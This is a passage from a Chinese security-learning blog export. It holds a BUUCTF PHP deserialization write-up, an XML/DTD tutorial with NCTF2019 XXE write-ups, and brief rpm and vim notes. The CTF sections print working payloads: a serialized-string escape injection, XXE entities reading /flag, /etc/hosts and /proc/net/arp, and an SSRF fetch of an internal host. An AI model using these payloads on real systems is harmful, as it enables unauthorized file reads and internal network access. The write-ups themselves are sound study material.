class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取出关键信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET 传参 f phpinfo  得到信息 d0g3_f1ag.php</p><p>show_image进行反序列化 <strong>$userinfo[‘img’]是flag.php的base64加密</strong></p><p>filter函数进行过滤 会将字符串的特定字符为空由此(字符逃逸)</p><p>看到unset销毁$_SESSION 重新赋值 </p><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>即会将之前$_SESSION存在的变量全部移除</p><p>post</p><p>ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"><span class="comment">#最后为</span></span><br><span class="line"><span class="string">&quot;a:2:&#123;s:7:&quot;</span>phpflag<span class="string">&quot;;s:48:&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot; ;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>经过filter过滤后phpflag就会被替换成空，</p><p>s:7:”phpflag”;s:48:” 就变成了 s:7:””;s:48:”;即完成了逃逸。</p><p>两个键值分别被序列化成了</p><p>s:7:””;s:48:”;s:1:”1”;即键名叫”;s:48: 对应的值为一个字符串1。这个键值对只要能瞒天过海就行。</p><p>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;键名img对应的字符串是d0g3_f1ag.php的base64编码。</p><p><code>得到</code></p><p>$flag = ‘flag in /d0g3_fllllllag’;</p><p>base64加密  L2QwZzNfZmxsbGxsbGFn</p><p>得出flag</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> php序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从XML到XXE漏洞+ctf实战</title>
      <link href="/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h1><p>XML是可扩展标记语言（EXtensible Markup Language）。</p><p><strong>XML与HTML的区别</strong></p><p>XML 被设计用来传输和存储数据，其重点是数据的内容。<br>HTML 被设计用来显示数据，其重点是数据的表现。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p><p><strong>为什么选择XML</strong><br>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML格式与语法</strong><br><code>基本格式：</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><span class="comment">&lt;!--xml文件的声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>                                                 <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span>        <span class="comment">&lt;!--bookstore的子元素，category为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>1<span class="tag">&lt;/<span class="name">title</span>&gt;</span>            <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">year</span>&gt;</span>2021<span class="tag">&lt;/<span class="name">year</span>&gt;</span>            <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span>                          <span class="comment">&lt;!--book的结束--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span>                         <span class="comment">&lt;!--bookstore的结束--&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p><p>standalone值是yes的时候表示DTD仅用于检验文档结构，从而外部实体被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p><p><code>基本语法：</code></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><p>- 在 XML 中，空格会被保留,多个空格不会被合并为一个。</p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>i<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>am<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>ppp<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ya!!!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当使用外部DTD时，通过如下语法引入。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> <span class="meta-keyword">category</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> (<span class="meta-keyword">element-content</span>)&gt;</span></span><br></pre></td></tr></table></figure><p>外部DTD实例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>i<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>am<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>ppp<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ya!!!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd：</p><p>只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br></pre></td></tr></table></figure><p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">element-name</span> <span class="meta-keyword">ANY</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>元素</th><th>&lt;!ENTITY 元素名称 类别&gt;</th><th>&lt;!ELEMENT 元素名称(元素内容)&gt;</th></tr></thead><tbody><tr><td>空元素</td><td>&lt;!ENTITY 元素名称 EMPTY&gt;</td><td>&lt;!ELEMENT &lt;br&gt; EMPTY&gt;&lt;/br&gt;</td></tr><tr><td>只有PCDATA的元素</td><td>&lt;!ENTITY 元素名称 #(PCDATA)&gt;</td><td>&lt;!ELEMENT from (#PCDATA)&gt;</td></tr><tr><td>任何内容的元素</td><td>&lt;!ENTITY 元素名称 ANY&gt;</td><td>&lt;!ELEMENT note ANY&gt;</td></tr><tr><td>子元素的元素</td><td>&lt;!ENTITY 元素名称 (子元素名称1,子元素名称2,……)&gt;</td><td>&lt;!ELEMENT note(to,from,heading,body)&gt;</td></tr></tbody></table><p>不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换</p><p>- CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h2 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h2><p>属性声明使用以下语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><p>DTD实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment identity CDATA &quot;A&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment identity=&quot;A&quot; /&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD-实体"></a>DTD-实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可以在内部或外部进行声明</p><h3 id="一个内部实体声明"><a href="#一个内部实体声明" class="headerlink" title="一个内部实体声明"></a>一个内部实体声明</h3><p><strong>语法</strong></p><p>&lt;!ENTITY entity-name “entity-value”&gt;</p><p><strong>实例</strong></p><p>DTD 实例:</p><p>&lt;!ENTITY writer “Donald Duck.”&gt;<br>&lt;!ENTITY copyright “Copyright runoob.com”&gt;</p><p>XML 实例：</p><p>&lt;author&gt;&writer;&amp;copyright;&lt;/author&gt;</p><p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p><hr><h3 id="一个外部实体声明"><a href="#一个外部实体声明" class="headerlink" title="一个外部实体声明"></a>一个外部实体声明</h3><p><strong>语法</strong></p><p>&lt;!ENTITY entity-name SYSTEM “URI/URL”&gt;</p><p><strong>实例</strong></p><p>DTD 实例:</p><p>&lt;!ENTITY writer SYSTEM “<a href="http://www.runoob.com/entities.dtd&quot;&gt;">http://www.runoob.com/entities.dtd&quot;&gt;</a><br>&lt;!ENTITY copyright SYSTEM “<a href="http://www.runoob.com/entities.dtd&quot;&gt;">http://www.runoob.com/entities.dtd&quot;&gt;</a></p><p>XML example:</p><p>&lt;author&gt;&writer;&amp;copyright;&lt;/author&gt;</p><p>下面给两道xxe的题</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>xxe直接构造查看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>通过标题可知为xxe漏洞</p><p>post报文直接构造xml</p><p>通过读取<code>/etc/hosts</code>和<code>/proc/net/arp</code> 得到C段的ip。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hosts&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>得到</code></p><p>127.0.0.1    localhost<br>::1    localhost ip6-localhost ip6-loopback<br>fe00::0    ip6-localnet<br>ff00::0    ip6-mcastprefix<br>ff02::1    ip6-allnodes<br>ff02::2    ip6-allrouters</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/net/arp&quot;</span> &gt;</span>]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><p>IP address       HW type     Flags       HW address            Mask     Device<br>10.0.145.2       0x1         0x2         02:42:0a:00:91:02           *           eth0</p><p>访问10.0.145.2直接报错，但没关系，我们可以进行<strong>C段扫描</strong>(暴力破解)</p><p>10.0.145.11</p><p>得出flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://10.0.145.11&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>213<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rpm命令管理</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="rpm命令管理"><a href="#rpm命令管理" class="headerlink" title="rpm命令管理"></a>rpm命令管理</h1><p>树形依赖<br>环形依赖<br>模块依赖:<br><a href="http://www.rpmfind.net/linux/RPM/">www.rpmfind.net </a> </p><h1 id="yun在线依赖"><a href="#yun在线依赖" class="headerlink" title="yun在线依赖"></a>yun在线依赖</h1><h1 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h1><p>rpm -ivh 包全名<br>选项：<br>    -i(install)<br>    -v(verbose)<br>    -h(hash)<br>    –nodeps<br>rmp -Uvh 包全名 更新<br>rmp -e 包名 卸载   </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim基础</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/vim%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="vim基础"><a href="#vim基础" class="headerlink" title="vim基础"></a>vim基础</h1><p>set nu 设置行号  </p><h2 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>a</td><td>在光标所在字符后插入</td></tr><tr><td>A</td><td>在光标所在行尾插入</td></tr><tr><td>i</td><td>在光标所在字符前插入</td></tr><tr><td>I</td><td>在光标所在行首插</td></tr><tr><td>o</td><td>在光标下插入新行</td></tr><tr><td>O</td><td>在光标上插入新行</td></tr></tbody></table><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>: set nu</td><td>设置行号</td></tr><tr><td>$</td><td>移至行尾</td></tr><tr><td>: set nonu</td><td>取消行号</td></tr><tr><td>0</td><td>移至行首</td></tr><tr><td>gg</td><td>到第一行</td></tr><tr><td>G</td><td>到最后一行</td></tr><tr><td>nG</td><td>到第n行</td></tr><tr><td>: n</td><td>到第n行</td></tr></tbody></table><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>x</td><td>删除光标所在处字符</td></tr><tr><td>nx</td><td>删除光标所在处后n个字符</td></tr><tr><td>dd</td><td>删除光标所在行，ndd删除n行</td></tr><tr><td>dG</td><td>删除光标所在行到文件末尾内容</td></tr><tr><td>D</td><td>删除光标所在处到行尾内容</td></tr><tr><td>:nl.n2d</td><td>删除指定范围的行</td></tr></tbody></table><h2 id="复制和剪切"><a href="#复制和剪切" class="headerlink" title="复制和剪切"></a>复制和剪切</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>yy</td><td>复制当前行</td></tr><tr><td>nyy</td><td>复制当前行以下n行</td></tr><tr><td>dd</td><td>剪切当前行</td></tr><tr><td>ndd</td><td>剪切当前行以下n行</td></tr><tr><td>p、P</td><td>粘贴在当前光标所在行下或行上</td></tr></tbody></table><h2 id="替换和取消"><a href="#替换和取消" class="headerlink" title="替换和取消"></a>替换和取消</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>r</td><td>取代光标所在处字符</td></tr><tr><td>R</td><td>从光标所在处开始替换字符，按Esc结束</td></tr><tr><td>u</td><td>取消上一步操作</td></tr></tbody></table><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>string</td><td>搜索指定字符串，搜索时忽略大小写:set ic</td></tr><tr><td>n</td><td>搜索指定字符串的下一个出现位置</td></tr><tr><td>:%s/old/new/g</td><td>全文替换指定字符串 g是不询问 c询问确认</td></tr><tr><td>:nl n2s old/new/g</td><td>在一定范围内替换指定字符串</td></tr></tbody></table><h2 id="保存和退出"><a href="#保存和退出" class="headerlink" title="保存和退出"></a>保存和退出</h2><p>命令|作用<br>:w|保存修改<br>:w new filename|另存为指定文件<br>:wq|保存修改并退出<br>ZZ|快捷键，保存修改并退出<br>:q!|不保存修改退出<br>:wq!|保存修改并退出(文件所有者及root可使用)</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><dl><dt>导入命令执行结果:r !命令<br>定义快捷键:map快捷键触发命令<br>范例:  : map  ^P I#&lt;ESC&gt;</dt><dd>map B Ox<br>连续行注释<br>:nl.n2s/^/#/g<br>:n1.n2s/^#/lg 删除开头的#<br>:n1 .n2s/^////g 插入//<br>替换 :ab aname bname 会将a替换成b</dd></dl><p>将常用的快捷键放在.vimrc下</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
